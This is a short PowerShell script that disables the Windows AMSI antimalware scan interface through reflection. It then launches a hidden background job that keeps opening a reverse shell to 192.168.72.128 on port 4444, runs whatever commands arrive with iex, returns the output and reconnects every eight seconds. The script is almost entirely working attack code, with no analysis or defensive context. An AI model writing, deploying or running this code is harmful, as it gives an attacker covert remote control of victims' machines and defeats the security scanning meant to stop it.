$ip = "192.168.72.128"
$port = 4444

# Silent AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Fully hidden reverse shell
Start-Job -ScriptBlock {
    param($i, $p)
    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($i, $p)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.AutoFlush = $true

            $writer.WriteLine("[+] Hidden reverse shell connected - $(Get-Date)")
            $writer.Write("PS $($pwd.Path)> ")

            while ($true) {
                $command = $reader.ReadLine()
                if ($command) {
                    try {
                        $result = iex $command 2>&1 | Out-String
                        $writer.Write($result)
                    } catch {
                        $writer.WriteLine("ERROR: $($_.Exception.Message)")
                    }
                }
                $writer.Write("PS $($pwd.Path)> ")
            }
        } catch {
            Start-Sleep -Seconds 8
        }
    }
} -ArgumentList $ip, $port | Out-Null
